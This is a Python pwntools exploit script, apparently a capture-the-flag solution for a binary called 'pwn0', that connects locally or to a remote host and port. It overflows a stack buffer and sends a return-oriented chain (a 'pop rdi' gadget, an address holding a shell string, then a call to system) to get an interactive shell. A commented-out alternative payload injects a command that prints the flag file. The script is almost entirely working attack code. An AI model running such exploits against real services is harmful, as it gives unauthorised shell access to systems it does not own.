#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './pwn0'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# info
# gadget
prdi = 0x00000000004006d3 # pop rdi ; ret
ret = 0x00000000004006d4
sh = 0x601040

# elf, libc

# rop1
offset = cyclic_find(0x6161616b)
# exp1
# payload = 'tac<flag&&ps &&'.ljust(offset,'a')
# payload += p64(0x400653)

# exp2
payload = 'a'*offset
payload += p64(prdi) + p64(0x601040) + p64(elf.sym['system'])
# type base64<flag after getshell
debug()
# ru('')
sl(payload)
# sl('')
# data = p.recvall(timeout=10)
# f=open('out','w')
# f.write(data)
# f.close()
# debug()
# info_addr('tag',addr)
# log.warning('--------------')

p.interactive()
